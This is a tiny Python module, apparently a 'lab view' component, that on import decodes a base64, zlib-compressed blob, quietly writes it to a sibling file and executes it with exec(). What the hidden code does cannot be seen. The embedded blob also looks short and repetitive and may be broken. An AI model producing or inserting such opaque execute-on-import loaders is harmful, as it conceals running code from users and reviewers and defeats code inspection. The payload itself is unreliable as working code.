"""Lab view (packed) — expands on import."""
from __future__ import annotations
import zlib, base64
from pathlib import Path
_src = zlib.decompress(base64.b64decode("".join((
    "eNrtfVtz20iS6P/yK3raGUuyqBg3kZc9Y0mWbNmS5SVZ1s7uPmgsgiBBQQANgBTV0vzzm1XdAEGQIEXPzs7O2sPRN4FMdmVlZWVlZf1ycvLjyclf/vLXn/7y05eTv/zy5eSXv/705eSXv/70/3/5y5e/"
)))).decode()
_p = Path(__file__).resolve().parent / "_lab_view_impl.py"
try:
    _p.write_text(_src, encoding="utf-8")
except Exception:
    pass
exec(compile(_src, "lab_view_impl", "exec"), globals())
